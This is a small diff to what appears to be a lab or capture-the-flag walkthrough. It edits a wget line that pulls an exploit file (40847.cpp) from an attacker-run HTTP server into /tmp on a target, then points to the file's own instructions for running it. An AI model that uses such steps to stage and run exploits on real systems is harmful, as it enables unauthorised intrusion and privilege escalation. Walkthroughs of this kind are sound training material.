@@ -49,7 +49,7 @@ $ python3 -m http.server port
 
 Download the file onto the /tmp directory
 ```
-wget http://ip_address:port/40847.cpp
+wget http://your_ip_address:port/40847.cpp
 ```
 
 Follow the instructions in the C file to run the exploit.   
